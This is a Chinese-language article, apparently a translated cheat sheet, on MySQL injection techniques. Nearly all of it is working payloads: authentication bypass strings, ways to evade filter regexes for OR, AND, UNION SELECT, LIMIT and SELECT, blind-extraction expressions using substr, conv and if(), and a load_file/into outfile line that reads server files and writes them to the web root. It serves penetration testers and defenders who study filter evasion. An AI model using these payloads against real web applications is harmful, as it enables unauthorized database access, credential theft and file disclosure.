# MySQL注入技巧

原文地址：http://websec.files.wordpress.com/2010/11/sqli2.pdf

0x00、介绍
=======

* * *

也可以参考瞌腄龙的mysql注入科普：http://drops.wooyun.org/tips/123

很多东西都是一样的，但是有一些小技巧确实很使用。

以下所有技巧都只在mysql适用，因为它太灵活了

0x01 MYSQl灵活的语法
===============

* * *

**1 MySQL语法以及认证绕过**

注释符：

```
#， 
-- X(X为任意字符)
/*(MySQL-5.1)
;%00
`
'or 1=1;%00
'or 1=1 union select 1,2`'
'or 1=1 #
'/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138
'/*!or*/ 1=1 -- -

```

前缀：

任意混合`+ - ~ !`

```
'or --+2=- -!!!'2

```

测试后发现`and/or`后面可以跟上偶数个`!、~`可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略

```
'or- -!!!1=1；

```

运算符：

```
^, =, !=, %, /, *, &, &&, |, ||, <, >, <<, >>, >=, <=, <>, <=>, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……

'or 1 rlike '1

```

空格替换：`%20, %09, %0a, %0b, %0c, %0d, %a0`

也可以插入括号，前缀，操作符，引号

```
'or+(1)sounds/**/like"1"--%a0-

```

字符串格式

```
    ' or "a"='a'
    ' or 'a'=n'a'               //unicode
    ' or 'a'=b'1100001'         //binary
    ' or 'a'=_binary'1100001'   //5.5.41下测试无效
    ' or 'a'=x'61'              //16进制

```

**2、MySQL常用的一些小工具**

常量：`true， false， null， \N, current_timestamp....`

变量：`@myvar:=1`

系统变量：`@@version, @@datadir....`

常用函数：`version(), pi(), pow(), char(), substring()....`

**3、MySQL类型转换**

```
' or 1=true #true=1, false=0
' or 1 #true
' or version()=5.5 #5.5.41-log

' or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4

select * from users where 'a'='b'='c'
select * from users where ('a'='b')='c'
select * from users where (false)='c'
select * from users where (0)='c'
select * from users where (0)=0
select * from users where true
select * from users

```

以上的语句都是同样的效果

**4、认证绕过**

绕过语句：`'='`

```
select data from users where name="="
select data from users where flase=" 
select data from users where 0=0

```

绕过语句：`'-'`

```
select data from users where name=''-''
select data from users where name=0-0
select data from users where 0=0

```

0x02 关键字过滤
==========

* * *

空格

过滤代码`/\s/`

```
%20, %09, %0a, %0b, %0c, %0d, %a0

```

关键字`OR，AND`

过滤代码`/\sor\s/i,/\sand\s/i`

```
'||1='1     #or
'='
'&&1='1     #and

```

关键字`union select`

过滤代码`/union\s+select/i`

```
'and(true)like(false)union(select(pass)from(users))#
'union [all|distinct] select pass from users#
'union%a0select pass from users#
'union/*!select*/pass from users#
/vuln.php?id=1 union/*&sort=*/select pass from users-- -

```

如果单独过滤union,使用盲注来获取数据

```
'and(select pass from users limit 1)='secret

```

通过子查询获取单值来进行比较

关键字`limit`

过滤代码`/limit/i`

```
'and(select pass from users where id=1)='a
'and(select pass from users group by id having id=1)='a
'and length((select pass from users having substr(pass,1,1)='a'))

```

关键字`having`

过滤代码`/having/i`

```
'and(select substr(group_concat(pass),1,1)from users)='a

```

关键字`select ... from`

过滤代码`/SELECT\s+[A-Za-z.]+\s+FROM/i/i`

```
select [all|distinct] pass from users
select`table_name`from`information_schema` . `tables`
select pass as alias from users
select pass aliasalias from users
select pass`alias alias`from users
select+pass%a0from(users)

```

关键字`select`

过滤代码`/select/i`

### 1 有文件读取权限

```
' and substr(load_file('file'),locate('DocumentRoot',(load_file('file')))+
length('DocumentRoot'),10)='a'='' into outfile '/var/www/dump.txt

```

### 2 获取列名

```
' and 列名 is not null#
' procedure analyse()#

```

使用substr来做过滤条件

```
'and substr(pass,1,1)='a

```

关键字`select,and,&`

'0#

```
select data from users where name = ''-0 # int typecast
select data from users where name = 0 # int typecast
select data from users where 0 = 0 # true

```

'-1#

```
select data from users where 0 = -1 # false

```

使用条件判断来进行`true、false`的选择

```
    ifnull(nullif()), case when， if()
    '-if(name='Admin',1,0)#

```

使用嵌套条件`'-if(`

```
if(name='Admin',1,0), // condition
if(substr(pass,1,1)='a',1,0) // if true
,0)# // if false    

```

0x03 函数过滤
=========

* * *

构建字符串相关函数

```
unhex char hex ascii ord substr substring mid pad left right insert
' and substr(data,1,1) = 'a'#
' and substr(data,1,1) = 0x61# 0x6162
' and substr(data,1,1) = unhex(61)# unhex(6162)
' and substr(data,1,1) = char(97)# char(97,98)
' and hex(substr(data,1,1)) = 61#
' and ascii(substr(data,1,1)) = 97#
' and ord(substr(data,1,1)) = 97#

```

使用conv来进行进制的转换

```
' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
' and substr(data,1,1) = lower(conv(11,10,36))# 'b'
' and substr(data,1,1) = lower(conv(36,10,36))# 'z'

```

使用函数来猜解数据

```
' and substr(data,1,1) = 'a'#
' and substring(data,1,1) = 'a'#
' and mid(data,1,1) = 'a'#

```

不适用逗号来获取

```
' and substr(data from 1 for 1) = 'a'#

```

同样也可以使用一下比较少见的函数来尝试绕过

```
lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'
rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'
left(data,1)
reverse(right(reverse(data),1))
insert(insert(version(),1,0,space(0)),2,222,space(0))

```

有些函数有类似搜索匹配的功能

```
'-if(locate('f',data),1,0)#
'-if(locate('fo',data),1,0)#
'-if(locate('foo',data),1,0)#
instr(), position()

```

使用函数进行字符串的切割

```
length(trim(leading 'a' FROM data)) # length will be shorter
length(replace(data, 'a', '')) # length will be shorter

```

2种方式都是相同效果

0x04 注入时主要使用的一些东西
=================

* * *

```
1个控制流程操作(select, case, if(), ...)
1个比较操作(=, like, mod(), ...)
1个字符串的猜解(mid(), left(), rpad(), …)
1个字符串生成(0x61, hex(), conv())

```

使用`conv([10-36],10,36)`可以实现所有字符的表示

```
false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T

```

更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考

```
http://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf

https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf

http://www.blackhatlibrary.net/SQL_injection

http://websec.ca/kb/sql_injection

```